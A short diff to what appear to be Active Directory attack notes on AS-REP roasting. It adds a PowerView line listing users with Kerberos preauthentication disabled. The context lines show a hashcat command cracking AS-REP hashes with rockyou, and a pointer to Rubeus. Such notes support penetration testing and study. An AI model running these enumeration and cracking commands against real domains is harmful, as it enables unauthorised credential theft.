@@ -35,6 +35,7 @@ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r rules/bes
 First, we run the PowerView `Get-DomainUser` command with the `-PreauthNotRequired` option to find users who have Kerberos preauthentication disabled:
 ```powershell
 Get-DomainUser -PreauthNotRequired
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 ```
 By using use _Rubeus_,[4](https://github.com/GhostPack/Rubeus)
 Compiled Version [->](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/tree/main/Tools)
